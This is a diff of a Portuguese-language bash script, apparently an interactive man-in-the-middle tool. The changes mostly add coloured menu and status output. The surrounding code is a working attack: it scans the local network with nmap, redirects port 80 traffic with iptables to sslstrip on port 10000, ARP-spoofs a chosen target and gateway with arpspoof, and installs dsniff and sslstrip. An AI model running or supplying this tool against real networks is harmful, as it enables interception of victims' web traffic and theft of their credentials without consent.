@@ -13,13 +13,13 @@ ARQ=cap_$DATA.log
 BANNER=$(figlet -f block -c "souz4")
 
 menu(){
-	echo "$BANNER"
-	echo "########salvando em: $ARQ#############"
-	echo "1. Identificar gateway"
-	echo "2. Identificar target"
-	echo "3. Iniciar"
-	echo "4. Instalar dependências(Debian e devirados)"
-	echo "99. Sair"
+	echo -e "\033[0;37m $BANNER\033[0m" 
+	echo -e "############salvando em: cap_$DATA.log###############"
+	echo -e " \033[1;34m 1.\033[0m Identificar gateway" 
+	echo -e " \033[1;34m 2.\033[0m Identidicar hosts"
+	echo -e " \033[1;34m 3.\033[0m Iniciar" 
+	echo -e " \033[1;34m 4.\033[0m Instalar dependencias(Debian e derivados)"
+	echo -e " \033[1;34m 5.\033[0m Sair" 
 	read -p "> Opção: " opt
 	
 	case $opt in
@@ -36,10 +36,11 @@ get_router(){
 	ip_router=$(route -n | awk '{print $2}' | grep [1-9])
 	if [ $? -eq 0 ]
 	then
-		echo "> GATEWAY: $ip_router"
+		#echo -e "> GATEWAY: $ip_router"
+		echo -e "\n \033[1;33m ~ GATEWAY: $ip_router \033[0m" 
 		menu
 	else
-		echo "[ FALHA ] Ocorreram erros!"
+		echo -e "\n [\033[0;31m FALHA\033[0m ] Ocorreram erros!"
 		sleep 2
 		exit 0
 	fi
@@ -50,12 +51,12 @@ scan_target(){
 	nmap -Pn -T3 $REDE/24 > scan_hosts.txt 2> /dev/null
 	if [ $? -eq 0 ]	
 	then
-		echo "[ OK ] Esses foram os hosts encontrados!"
+		echo -e " \033[1;33m ~ Esses foram os hosts encontrados! \033[0m"
 		egrep '([0-9]{1,3}\.){3}[0-9]{1,3}' scan_hosts.txt | awk '{print $5}' | grep [1-9]
-		echo "> Escolha o alvo."
+		echo " ~ Escolha o alvo."
 		menu
 	else
-		echo "[ FALHA ] Ocorreram erros em encontrar os hosts"
+		echo -e "\n[\033[0;31m FALHA\033[0m ] Ocorreram erros em encontrar os hosts"
 		sleep 2
 		exit 0
 	fi
@@ -70,7 +71,7 @@ iniciar_ataque(){
 	iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
 	if [ $? -eq 0 ]
 	then
-		echo -e "\n [ OK ] Regras criadas com sucesso!"	
+		echo -e "\n [\033[0;32m OK\033[0m ] Regras criadas com sucesso!"	
  		read -p "> TARGET: " ip_target
 		read -p "> GATEWAY: " ip_router
 		nohup xterm -e 2> /dev/null "arpspoof -i eth0 $ip_router -t $ip_target" &
@@ -83,7 +84,7 @@ iniciar_ataque(){
 		#echo "~ Vizualizando o arquivo..."
 		#nice -n -20 tail -f $ARQ
 	else
-		echo -e "\n [ FALHA ] Ocorreram erros em criar regras."
+		echo -e "\n [\033[0;31m FALHA\033[0m ] Ocorreram erros em criar regras."
 		sleep 2
 		exit 0
 	fi
@@ -97,9 +98,9 @@ install_req(){
 	apt-get install dsniff sslstrip xterm figlet nmap -y
 	if [ $? -eq 0 ]
 	then
-		echo "[ OK ]Os pacotes necessários foram instalados!"
+		echo -e "\n [\033[0;32m OK\033[0m ] Os pacotes necessários foram instalados!"
 	else
-		echo "[ FALHA ] Os pacotes não foram encontrados."
+		echo -e "\n [\033[0;31m FALHA\033[0m ] Os pacotes não foram encontrados."
 	fi
 }
 
@@ -110,7 +111,7 @@ do
 		clear
 		menu
 	else
-		echo "Execute o script como root!"
+		echo "~ Execute o script como root!"
 		sleep 3
 		exit 0
 	fi
